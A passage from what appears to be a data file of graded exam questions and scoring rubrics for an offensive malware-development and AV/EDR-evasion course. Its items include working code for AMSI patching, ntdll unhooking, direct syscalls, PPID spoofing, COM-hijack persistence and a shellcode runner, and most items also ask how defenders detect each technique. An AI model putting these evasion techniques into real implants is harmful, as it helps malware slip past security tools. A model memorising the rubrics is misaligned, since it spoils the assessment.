      { id: "telemetry", description: "Discusses ETW/kernel telemetry differences: LoadLibrary generates image load events (for stomp base DLL), VirtualAlloc generates VA events, all may trigger CreateThread events for execution", points: 2, keywords: ["ETW", "image load", "kernel callback", "PsSetLoadImageNotifyRoutine", "VA events", "telemetry"], check: "Student discusses at least 2 telemetry differences between the techniques" },
      { id: "when-to-use", description: "Explains when to choose module stomping: when memory scanning is a threat, when you need to hide in image-backed memory, but acknowledges trade-offs like the DLL file hash mismatch", points: 1, keywords: ["memory scan", "image-backed", "choose", "trade-off", "hash mismatch", "integrity check"], check: "Student provides reasoned guidance on when module stomping is the right choice" },
    ],
    gaps: [
      { if_missing: "module-stomp-mechanics", gap: "Module stomping technique and MEM_IMAGE memory semantics" },
      { if_missing: "virtualalloc-comparison", gap: "Detection profile of private executable memory allocations" },
      { if_missing: "reflective-comparison", gap: "Memory characteristics of reflective DLL loading" },
      { if_missing: "telemetry", gap: "ETW and kernel callback telemetry for code injection techniques" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "persistence-com-hijack",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `A red teamer wrote this PowerShell script to set up COM hijacking persistence, but it doesn't trigger when the user logs in:

\`\`\`powershell
# Target: hijack the CLSID for "CAccPropServicesClass" which explorer.exe loads on startup
$clsid = "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
$dllPath = "C:\\Users\\Public\\legit.dll"

# Create registry entries
New-Item -Path "HKLM:\\SOFTWARE\\Classes\\CLSID\\$clsid\\InprocServer32" -Force
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Classes\\CLSID\\$clsid\\InprocServer32" -Name "(Default)" -Value $dllPath
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Classes\\CLSID\\$clsid\\InprocServer32" -Name "ThreadingModel" -Value "Both"
\`\`\`

1. Why doesn't this work as persistence?
2. Fix the script.
3. How would a defender detect this persistence mechanism?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "hkcu-not-hklm", description: "The script writes to HKLM which requires admin and where the legitimate entry already exists; COM hijacking works by creating a per-user override in HKCU which takes precedence", points: 3, keywords: ["HKCU", "HKLM", "per-user", "precedence", "override", "admin", "user-level"], check: "Student identifies that HKCU should be used instead of HKLM for the COM hijack" },
      { id: "correct-fix", description: "Provides the fix: change HKLM to HKCU (HKCU:\\SOFTWARE\\Classes\\CLSID\\...)", points: 2, keywords: ["HKCU:\\\\SOFTWARE\\\\Classes", "HKCU", "change", "fix"], check: "Student provides corrected registry path using HKCU" },
      { id: "detection", description: "Describes detection methods: monitoring HKCU CLSID changes with Sysmon Event ID 12/13, comparing InprocServer32 values against known-good, autoruns tool, or scheduled registry audits", points: 2, keywords: ["Sysmon", "Event ID 12", "Event ID 13", "autoruns", "registry monitoring", "known-good", "audit"], check: "Student describes at least one concrete detection method for COM hijacking" },
    ],
    gaps: [
      { if_missing: "hkcu-not-hklm", gap: "COM hijacking registry precedence (HKCU over HKLM)" },
      { if_missing: "correct-fix", gap: "Correct COM hijacking implementation" },
      { if_missing: "detection", gap: "Detection methods for COM hijacking persistence" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "early-bird-injection",
  questionType: "design_solution",
  difficulty: 5,
  questionText: `Design an improved Early Bird injection technique that addresses the following constraints:

1. Avoid RWX memory allocations entirely
2. Do not use QueueUserAPC (it is hooked by the target EDR)
3. The target process should appear as a normal svchost.exe service instance
4. The shellcode should survive the target process's legitimate DLL initialization

Describe your approach step by step, the APIs you would use, and how your approach differs from the standard Early Bird technique. Discuss what telemetry your approach still generates and what an EDR could theoretically detect.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "no-rwx", description: "Describes allocating with PAGE_READWRITE, writing shellcode, then changing to PAGE_EXECUTE_READ with VirtualProtectEx before execution", points: 2, keywords: ["PAGE_READWRITE", "PAGE_EXECUTE_READ", "VirtualProtectEx", "two-step", "no RWX", "write then execute"], check: "Student describes the write-then-protect pattern to avoid RWX" },
      { id: "alternative-execution", description: "Proposes an alternative to QueueUserAPC: NtQueueApcThreadEx (special user APC), thread context hijacking (SetThreadContext to set RIP), or instrumentation callback", points: 3, keywords: ["NtQueueApcThreadEx", "SetThreadContext", "RIP", "instrumentation callback", "alternative", "not QueueUserAPC"], check: "Student proposes a viable alternative execution primitive to QueueUserAPC" },
      { id: "svchost-legitimacy", description: "Explains creating svchost with proper command line (-k netsvcs or similar), parent PID spoofing to services.exe, and matching expected service group", points: 2, keywords: ["svchost", "command line", "-k", "netsvcs", "parent PID", "services.exe", "PPID spoof", "service group"], check: "Student addresses making the svchost instance appear legitimate" },
      { id: "surviving-init", description: "Addresses shellcode surviving DLL init: placing shellcode in a region that won't be overwritten, or waiting for initialization to complete before executing, or using TLS callbacks", points: 2, keywords: ["DLL init", "survive", "overwritten", "initialization", "wait", "TLS", "safe region"], check: "Student addresses the shellcode survival problem during process initialization" },
      { id: "remaining-telemetry", description: "Acknowledges remaining telemetry: cross-process handle opens logged by kernel callbacks, memory protection changes visible to ETW, thread creation events, potential image load mismatches", points: 1, keywords: ["telemetry", "handle", "kernel callback", "ETW", "ObRegisterCallbacks", "protection change", "detectable"], check: "Student acknowledges what detection telemetry remains despite evasion efforts" },
    ],
    gaps: [
      { if_missing: "no-rwx", gap: "Memory protection staging to avoid RWX indicators" },
      { if_missing: "alternative-execution", gap: "Alternative code execution primitives beyond QueueUserAPC" },
      { if_missing: "svchost-legitimacy", gap: "Creating legitimate-appearing svchost instances" },
      { if_missing: "remaining-telemetry", gap: "Understanding residual detection telemetry in advanced injection" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "shellcode-execution",
  questionType: "spot_vuln",
  difficulty: 1,
  questionText: `A beginner malware developer wrote this shellcode runner. What are the problems?

\`\`\`c
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "\\xfc\\x48\\x83\\xe4\\xf0..."; // msfvenom payload

int main() {
    void* exec = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
\`\`\`

List at least three problems with this code from both a functionality and OPSEC perspective.`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "static-shellcode", description: "The shellcode is embedded as a static global byte array, making it trivially detectable by static signature scanning", points: 2, keywords: ["static", "global", "signature", "static analysis", "byte array", "embedded", "detectable"], check: "Student identifies static shellcode embedding as a detection issue" },
      { id: "rwx-flag", description: "PAGE_EXECUTE_READWRITE is a red flag for security products; should allocate RW, write, then change to RX", points: 2, keywords: ["RWX", "PAGE_EXECUTE_READWRITE", "red flag", "PAGE_READWRITE", "VirtualProtect"], check: "Student flags the RWX allocation" },
      { id: "no-encryption", description: "The shellcode is not encrypted or encoded; it sits in the binary in cleartext, detectable by AV static scanning and YARA rules", points: 2, keywords: ["not encrypted", "cleartext", "encoded", "YARA", "plain", "unencrypted", "AV"], check: "Student identifies lack of payload encryption" },
    ],
    gaps: [
      { if_missing: "static-shellcode", gap: "Shellcode storage OPSEC (avoiding static embedding)" },
      { if_missing: "rwx-flag", gap: "Memory protection OPSEC (avoiding RWX)" },
      { if_missing: "no-encryption", gap: "Payload encryption for static analysis evasion" },
    ],
  },
},

// --- evasion (AV/EDR evasion) ---

{
  competencyId: "evasion",
  subTopic: "api-hashing",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `This function resolves a Win32 API by hash instead of by name. Trace through it and explain each step:

\`\`\`c
#define HASH_KEY 13

DWORD hashFunction(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash = (hash >> HASH_KEY) | (hash << (32 - HASH_KEY));
        hash += *str++;
    }
    return hash;
}

FARPROC resolveByHash(HMODULE hModule, DWORD targetHash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)hModule + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD names = (PDWORD)((PBYTE)hModule + exports->AddressOfNames);
    PWORD ordinals = (PWORD)((PBYTE)hModule + exports->AddressOfNameOrdinals);
    PDWORD funcs = (PDWORD)((PBYTE)hModule + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)((PBYTE)hModule + names[i]);
        if (hashFunction(name) == targetHash) {
            return (FARPROC)((PBYTE)hModule + funcs[ordinals[i]]);
        }
    }
    return NULL;
}
\`\`\`

1. Explain the hash algorithm (what kind of hash is this?).
2. Walk through how the export directory tables are used together.
3. Why use API hashing instead of GetProcAddress? What does it hide?
4. What weakness does this approach still have?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "ror13-hash", description: "Identifies the hash as ROR13 (rotate right 13 bits) additive hash, a classic shellcode hash used since early 2000s malware", points: 2, keywords: ["ROR13", "rotate right", "13", "additive", "rotate", "classic"], check: "Student identifies the hash algorithm as ROR13 or describes the rotate-right-13-add pattern" },
      { id: "export-tables", description: "Explains the three parallel arrays: AddressOfNames (name RVAs), AddressOfNameOrdinals (ordinal indices), AddressOfFunctions (function RVAs); name at index i maps via ordinals[i] to funcs[ordinals[i]]", points: 2, keywords: ["AddressOfNames", "AddressOfNameOrdinals", "AddressOfFunctions", "parallel arrays", "ordinal", "index", "three tables"], check: "Student explains how the three export directory arrays work together" },
      { id: "evasion-value", description: "Explains that API hashing hides import names from static analysis: no strings like 'VirtualAlloc' in the binary, no IAT entries, complicates analyst's job", points: 2, keywords: ["no strings", "hide", "static analysis", "IAT", "import names", "complicates", "analyst"], check: "Student explains what API hashing conceals from analysis" },
      { id: "weaknesses", description: "Identifies weaknesses: hash values are well-known and catalogued (hashdb), ROR13 is a signature itself, collision risk, runtime behavior still visible to EDR hooks", points: 2, keywords: ["hash database", "hashdb", "well-known", "catalogued", "collision", "signature", "runtime", "hook", "detectable"], check: "Student identifies at least one weakness of API hashing" },
    ],
    gaps: [
      { if_missing: "ror13-hash", gap: "Common API hashing algorithms (ROR13)" },
      { if_missing: "export-tables", gap: "PE export directory table structure and traversal" },
      { if_missing: "evasion-value", gap: "Purpose of API hashing in import obfuscation" },
      { if_missing: "weaknesses", gap: "Limitations and detectability of API hashing" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "string-obfuscation",
  questionType: "spot_vuln",
  difficulty: 1,
  questionText: `A developer tried to hide suspicious strings in their implant:

\`\`\`c
// "VirtualAlloc" XOR'd with key 0x41
char encStr[] = {0x17,0x28,0x33,0x35,0x34,0x22,0x2d,0x00,0x2d,0x2d,0x2e,0x24,0x00};

void decryptString(char* buf, int len, char key) {
    for (int i = 0; i < len; i++)
        buf[i] ^= key;
}

// Later in code:
char funcName[13];
memcpy(funcName, encStr, 13);
decryptString(funcName, 13, 0x41);
FARPROC pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), funcName);
\`\`\`

Identify at least three OPSEC problems with this string obfuscation approach.`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "single-byte-xor", description: "Single-byte XOR is trivially reversible by any analyst or automated tool; it's one of the first things AV emulators try", points: 2, keywords: ["single byte", "trivial", "reversible", "XOR", "brute force", "256 keys", "emulator"], check: "Student identifies single-byte XOR as trivially breakable" },
      { id: "null-in-cipher", description: "The XOR'd array contains 0x00 bytes (because 'A' XOR 0x41 = 0x00), which means the ciphertext itself reveals the key at those positions", points: 2, keywords: ["null byte", "0x00", "reveals key", "key exposure", "A XOR 0x41", "plaintext attack"], check: "Student notices the null bytes in the ciphertext leaking the key" },
      { id: "getmodulehandle-string", description: "kernel32.dll is passed as a plaintext string to GetModuleHandleA, which is itself a detectable indicator even though the function name is encrypted", points: 2, keywords: ["kernel32.dll", "plaintext", "GetModuleHandleA", "not encrypted", "string", "detectable"], check: "Student notices that kernel32.dll string is in plaintext defeating the purpose" },
    ],
    gaps: [
      { if_missing: "single-byte-xor", gap: "Weakness of single-byte XOR encryption for string obfuscation" },
      { if_missing: "null-in-cipher", gap: "Ciphertext analysis revealing XOR keys" },
      { if_missing: "getmodulehandle-string", gap: "Consistent string obfuscation across all sensitive strings" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "ntdll-unhooking",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `Explain how "full ntdll unhooking" works to bypass EDR inline hooks. Walk through this approach:

\`\`\`c
// 1. Map a fresh copy of ntdll from disk
HANDLE hFile = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll",
    GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
LPVOID freshNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

// 2. Find the .text section in both copies
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)freshNtdll;
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)freshNtdll + dos->e_lfanew);
PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if (!strcmp((char*)section[i].Name, ".text")) {
        // 3. Get the hooked ntdll's .text section
        LPVOID hookedText = (LPVOID)((ULONG_PTR)GetModuleHandleA("ntdll") +
            section[i].VirtualAddress);
        // 4. Overwrite hooked .text with clean copy
        DWORD oldProtect;
        VirtualProtect(hookedText, section[i].Misc.VirtualSize,
            PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(hookedText, (PBYTE)freshNtdll + section[i].PointerToRawData,
            section[i].Misc.VirtualSize);
        VirtualProtect(hookedText, section[i].Misc.VirtualSize,
            oldProtect, &oldProtect);
        break;
    }
}
\`\`\`

1. Why does this remove EDR hooks?
2. What is the key assumption this technique makes?
3. Name at least two ways an EDR can detect or prevent this.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "hook-mechanism", description: "Explains that EDR hooks overwrite the first bytes of ntdll functions with JMP instructions to their monitoring DLL; replacing .text with the clean on-disk copy overwrites these JMPs", points: 2, keywords: ["JMP", "overwrite", "inline hook", "trampoline", "detour", "first bytes", "clean copy"], check: "Student explains how EDR inline hooks work and why overwriting .text removes them" },
      { id: "assumption", description: "Identifies the key assumption: the on-disk ntdll.dll is unmodified/clean; if the EDR patches the file or uses a different hooking method, this fails", points: 2, keywords: ["on-disk", "unmodified", "clean", "assumption", "trusted", "file integrity"], check: "Student identifies the assumption that the disk copy of ntdll is trustworthy" },
      { id: "detection-methods", description: "Names detection methods: monitoring VirtualProtect calls on ntdll's .text section, hooking CreateFileA for ntdll.dll access, kernel-level ETW for page protection changes, periodic hook integrity checks", points: 2, keywords: ["VirtualProtect", "monitoring", "hook integrity", "ETW", "page protection", "CreateFile", "detect"], check: "Student names at least 2 detection/prevention methods for ntdll unhooking" },
      { id: "alternative-sources", description: "Mentions that advanced variants use ntdll from KnownDlls, from a suspended process, or by directly reading the syscall stubs to avoid touching the file at all", points: 2, keywords: ["KnownDlls", "suspended process", "\\KnownDlls\\ntdll.dll", "syscall stub", "direct syscall", "alternative source"], check: "Student mentions at least one alternative source for a clean ntdll copy" },
    ],
    gaps: [
      { if_missing: "hook-mechanism", gap: "EDR inline hooking mechanism on ntdll" },
      { if_missing: "assumption", gap: "Trust assumptions in ntdll unhooking" },
      { if_missing: "detection-methods", gap: "EDR detection capabilities for unhooking attempts" },
      { if_missing: "alternative-sources", gap: "Alternative clean ntdll acquisition methods (KnownDlls, suspended process)" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "direct-syscalls",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `This direct syscall implementation for NtAllocateVirtualMemory is supposed to bypass ntdll hooks, but it crashes on some Windows versions:

\`\`\`c
// syscall.asm (MASM)
.code
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h      ; SSN for NtAllocateVirtualMemory
    syscall
    ret
NtAllocateVirtualMemory ENDP
end
\`\`\`

\`\`\`c
// main.c
extern NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

void inject() {
    PVOID base = NULL;
    SIZE_T size = 4096;
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(), &base, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}
\`\`\`

1. Why does this crash on some Windows versions?
2. How would you fix it to work across Windows versions?
3. What is "indirect syscalls" and why might it be better than this approach?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "ssn-changes", description: "Explains that SSN (System Service Number) 0x18 is only valid for specific Windows builds; SSNs change between major and minor Windows versions", points: 3, keywords: ["SSN", "syscall number", "changes", "version", "build", "different", "not fixed"], check: "Student identifies that hardcoded SSNs change across Windows versions" },
      { id: "dynamic-resolution", description: "Describes the fix: dynamically resolve the SSN at runtime by reading it from ntdll's syscall stub (the mov eax,XX instruction), or use a lookup table per OS version", points: 2, keywords: ["dynamic", "resolve", "runtime", "read from ntdll", "stub", "lookup table", "halo's gate", "hell's gate"], check: "Student describes dynamic SSN resolution (Hell's Gate or similar approach)" },
      { id: "indirect-syscalls", description: "Explains indirect syscalls: instead of using your own syscall instruction, jump to the syscall;ret gadget inside ntdll itself; this makes the return address appear as if it came from ntdll, defeating call-stack analysis by EDR", points: 3, keywords: ["indirect", "jump to ntdll", "syscall gadget", "return address", "call stack", "stack trace", "legitimate"], check: "Student explains indirect syscalls and their call-stack advantage over direct syscalls" },
    ],
    gaps: [
      { if_missing: "ssn-changes", gap: "System Service Number variability across Windows versions" },
      { if_missing: "dynamic-resolution", gap: "Dynamic SSN resolution techniques (Hell's Gate, Halo's Gate)" },
      { if_missing: "indirect-syscalls", gap: "Indirect syscalls and call-stack based EDR detection" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "amsi-bypass",
  questionType: "predict_output",
  difficulty: 2,
  questionText: `This code patches AMSI (Antimalware Scan Interface) to disable script scanning. What does each step do, and what will happen when PowerShell tries to scan a script after this runs?

\`\`\`c
HMODULE hAmsi = LoadLibraryA("amsi.dll");
FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");

DWORD oldProtect;
VirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect);

// x64 patch: mov eax, 0x80070057 (E_INVALIDARG); ret
unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
memcpy(pAmsiScanBuffer, patch, sizeof(patch));

VirtualProtect(pAmsiScanBuffer, 6, oldProtect, &oldProtect);
\`\`\`

1. What does the patch bytes do at the assembly level?
2. Why is 0x80070057 (E_INVALIDARG) chosen as the return value?
3. After this patch, what happens when PowerShell executes \`Invoke-Mimikatz\`?`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "patch-explanation", description: "Explains the patch: B8 is mov eax,imm32 loading E_INVALIDARG, C3 is ret; the function immediately returns an error without scanning", points: 2, keywords: ["mov eax", "ret", "B8", "C3", "immediately returns", "error", "no scanning"], check: "Student correctly disassembles the patch bytes and explains the short-circuit" },
      { id: "error-code-reason", description: "Explains E_INVALIDARG makes the caller think the scan had an error rather than that malware was found; AMSI callers treat scan errors as non-malicious (fail-open)", points: 2, keywords: ["E_INVALIDARG", "error", "fail-open", "non-malicious", "not flagged", "caller ignores"], check: "Student explains the fail-open behavior when AmsiScanBuffer returns an error code" },
      { id: "post-patch-behavior", description: "After patching, PowerShell's AMSI integration silently skips scanning; Invoke-Mimikatz would execute without triggering AMSI-based detection (though other detection layers like ETW may still catch it)", points: 2, keywords: ["silently", "skip", "execute", "no detection", "AMSI bypassed", "ETW", "other layers"], check: "Student explains that AMSI scanning is bypassed but acknowledges other detection may remain" },
    ],
    gaps: [
      { if_missing: "patch-explanation", gap: "AMSI patch mechanics at the assembly level" },
      { if_missing: "error-code-reason", gap: "AMSI fail-open behavior and error handling" },
      { if_missing: "post-patch-behavior", gap: "Scope and limitations of AMSI bypass" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "ppid-spoofing",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `This PPID spoofing code is meant to make a new process appear as a child of explorer.exe, but the created process crashes:

\`\`\`c
DWORD explorerPid = 0;
// ... find explorer.exe PID ...

HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPid);

SIZE_T attrSize;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
LPPROC_THREAD_ATTRIBUTE_LIST attrs = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
    GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(attrs, 1, 0, &attrSize);

UpdateProcThreadAttribute(attrs, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    &hParent, sizeof(HANDLE), NULL, NULL);

STARTUPINFOEXA si = { 0 };
si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
si.lpAttributeList = attrs;

PROCESS_INFORMATION pi;
CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
\`\`\`

1. Why might the child process crash or behave unexpectedly?
2. What's the minimum set of access rights needed for the parent handle?
3. What other attribute would you add to make this stealthier?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "inherit-issue", description: "The child process inherits the environment, desktop, and security context of the spoofed parent; if explorer.exe runs in a different session or has a different desktop, the child may fail to access resources or crash", points: 2, keywords: ["inherit", "session", "desktop", "environment", "security context", "access denied", "different session"], check: "Student identifies the session/desktop/environment inheritance problem with PPID spoofing" },
      { id: "minimal-rights", description: "Identifies PROCESS_CREATE_PROCESS as the minimum access right needed for the parent handle, not PROCESS_ALL_ACCESS", points: 2, keywords: ["PROCESS_CREATE_PROCESS", "minimum", "not ALL_ACCESS", "least privilege"], check: "Student identifies PROCESS_CREATE_PROCESS as the minimal right" },
      { id: "mitigation-policy", description: "Suggests adding PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY to block non-Microsoft DLLs (PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON) to prevent EDR DLL from being injected into the new process", points: 3, keywords: ["MITIGATION_POLICY", "block non-Microsoft", "EDR DLL", "BLOCK_NON_MICROSOFT_BINARIES", "mitigation", "blockdlls"], check: "Student suggests mitigation policy attribute to block EDR DLL injection" },
    ],
    gaps: [
      { if_missing: "inherit-issue", gap: "Session and environment inheritance issues in PPID spoofing" },
      { if_missing: "minimal-rights", gap: "Minimum process access rights for PPID spoofing" },
      { if_missing: "mitigation-policy", gap: "Mitigation policy attributes for blocking EDR DLL injection" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "etw-patching",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `Explain how ETW (Event Tracing for Windows) patching works as an evasion technique. Specifically:

1. What is ETW and why do EDRs rely on it?
2. Walk through how patching \`EtwEventWrite\` in ntdll disables ETW-based telemetry for the current process.
3. What is the difference between patching \`EtwEventWrite\` and patching the \`NtTraceEvent\` syscall stub?
4. How would a defender detect that ETW has been tampered with?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "etw-purpose", description: "Explains ETW as Windows' tracing infrastructure that provides events to consumers (EDRs, event logs); covers both user-mode and kernel-mode providers", points: 2, keywords: ["tracing", "events", "provider", "consumer", "EDR", "event log", "telemetry", "user-mode", "kernel-mode"], check: "Student explains ETW's role as telemetry infrastructure and why EDRs depend on it" },
      { id: "patch-mechanism", description: "Describes patching EtwEventWrite: change its first bytes to 'xor eax,eax; ret' (return SUCCESS without writing any event), effectively silencing all ETW events from the process", points: 2, keywords: ["EtwEventWrite", "xor eax", "ret", "return 0", "SUCCESS", "silencing", "patch", "no events"], check: "Student describes the EtwEventWrite patching technique correctly" },
      { id: "ntdll-vs-kernel", description: "Explains the difference: patching EtwEventWrite stops user-mode ETW providers but kernel providers and callbacks (like PsSetCreateProcessNotifyRoutine) still fire; patching NtTraceEvent would block syscall-level tracing but is harder and less common", points: 2, keywords: ["user-mode", "kernel", "NtTraceEvent", "kernel providers", "callbacks", "PsSetCreateProcessNotifyRoutine", "still fire"], check: "Student distinguishes between user-mode ETW patching and kernel-level telemetry" },
      { id: "detection", description: "Describes detection: periodic integrity checking of EtwEventWrite bytes, ETW-TI (Threat Intelligence) provider that monitors from the kernel, or an ETW consumer noticing a sudden drop in events from a process", points: 2, keywords: ["integrity check", "ETW-TI", "Threat Intelligence", "sudden drop", "event gap", "tamper detection", "kernel consumer"], check: "Student describes at least one detection method for ETW patching" },
    ],
    gaps: [
      { if_missing: "etw-purpose", gap: "ETW architecture and its role in EDR telemetry" },
      { if_missing: "patch-mechanism", gap: "EtwEventWrite patching technique" },
      { if_missing: "ntdll-vs-kernel", gap: "Scope of user-mode ETW patching vs kernel-level telemetry" },
      { if_missing: "detection", gap: "Detection methods for ETW tampering" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "sleep-obfuscation",
  questionType: "design_solution",
  difficulty: 5,
  questionText: `Modern memory scanners can detect implants by scanning for executable regions containing suspicious patterns while the implant sleeps between C2 callbacks. Design a sleep obfuscation technique that protects the implant during sleep.

Your design should:
1. Encrypt the implant's memory region while sleeping
2. Change memory protections to non-executable during sleep
3. Have a mechanism to wake up and restore execution
4. Be resistant to the most obvious detection methods

Describe the architecture and the specific challenge of "who decrypts the decryptor."`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "encrypt-before-sleep", description: "Describes encrypting the implant's memory (text/data sections) with a key before entering sleep, then decrypting upon wake", points: 2, keywords: ["encrypt", "decrypt", "key", "sleep", "wake", "XOR", "AES", "RC4", "memory region"], check: "Student describes encrypting implant memory before sleep" },
      { id: "protection-change", description: "Changes memory protection to PAGE_READWRITE (or PAGE_NOACCESS) during sleep, removing the executable flag, then restores PAGE_EXECUTE_READ on wake", points: 2, keywords: ["PAGE_READWRITE", "PAGE_NOACCESS", "remove execute", "VirtualProtect", "restore", "non-executable"], check: "Student describes changing memory protections during sleep" },
      { id: "wake-mechanism", description: "Describes a wake mechanism: timer callback (CreateTimerQueueTimer), waitable timer, APC, or a separate small stub in a different region that handles the timer, decryption, and protection restoration", points: 2, keywords: ["timer", "CreateTimerQueueTimer", "waitable timer", "callback", "APC", "stub", "separate region"], check: "Student describes a viable wake-up mechanism" },
      { id: "bootstrap-problem", description: "Addresses the bootstrap problem: the code that decrypts must itself be executable; solutions include a small ROP chain, an unencrypted stub, or using system callbacks (timer callbacks execute from ntdll context)", points: 2, keywords: ["bootstrap", "decryptor", "ROP", "unencrypted stub", "who decrypts", "chicken-egg", "callback", "gadget"], check: "Student addresses the 'who decrypts the decryptor' bootstrapping problem" },
      { id: "detection-resistance", description: "Discusses how to resist detection: randomize sleep times, vary encryption keys, avoid leaving the same stub as a constant signature, handle the call stack during timer callback", points: 2, keywords: ["detection", "randomize", "vary key", "call stack", "stack spoofing", "signature", "timer callback stack"], check: "Student discusses at least one method to resist detection of the sleep obfuscation itself" },
    ],
    gaps: [
      { if_missing: "encrypt-before-sleep", gap: "Sleep-time memory encryption for implant protection" },
      { if_missing: "protection-change", gap: "Dynamic memory protection changes for evasion" },
      { if_missing: "wake-mechanism", gap: "Timer-based wake mechanisms for sleeping implants" },
      { if_missing: "bootstrap-problem", gap: "Bootstrap/chicken-egg problem in sleep obfuscation" },
      { if_missing: "detection-resistance", gap: "Hardening sleep obfuscation against memory scanners" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "sandbox-detection",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText: `Compare the following sandbox detection techniques in terms of reliability, false positive risk, and detectability by the sandbox itself:

1. Timing-based detection (RDTSC/GetTickCount measuring sleep acceleration)
2. Hardware fingerprinting (checking for VM-specific hardware: CPUID, MAC address, disk names)
3. User interaction checks (checking for recent mouse movements, open windows, realistic documents)
4. Environment checks (number of processes, installed software, domain membership)

Which approach(es) would you combine for a production implant, and why?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "timing", description: "Analyzes timing checks: reliable against accelerated sandboxes, but modern sandboxes can intercept RDTSC; low false positive risk on real hardware", points: 2, keywords: ["RDTSC", "GetTickCount", "sleep acceleration", "intercept", "hypervisor", "reliable", "timing"], check: "Student analyzes timing-based detection with both strengths and weaknesses" },
      { id: "hardware", description: "Analyzes hardware fingerprinting: VM-specific artifacts (VMware MAC prefix, VirtualBox CPUID, QEMU disk names) are reliable but easily spoofed by modern sandboxes; may cause false positives on legitimate VMs", points: 2, keywords: ["CPUID", "MAC address", "VMware", "VirtualBox", "QEMU", "spoofed", "false positive", "VM"], check: "Student analyzes hardware fingerprinting with spoofing risk and false positive concerns" },
      { id: "user-interaction", description: "Analyzes user interaction: checking for mouse movement, recent files, and application usage is hard to fake at scale; but automated analysis farms are adding synthetic user activity", points: 2, keywords: ["mouse movement", "recent files", "user activity", "synthetic", "hard to fake", "application usage"], check: "Student analyzes user interaction checks and the synthetic activity countermeasure" },
      { id: "recommendation", description: "Recommends combining multiple techniques (defense in depth) and explains rationale: no single check is decisive, layered checks with scoring thresholds reduce false positives while catching most sandboxes", points: 2, keywords: ["combine", "layered", "scoring", "threshold", "multiple", "defense in depth", "no single check"], check: "Student recommends a layered approach with reasoning" },
    ],
    gaps: [
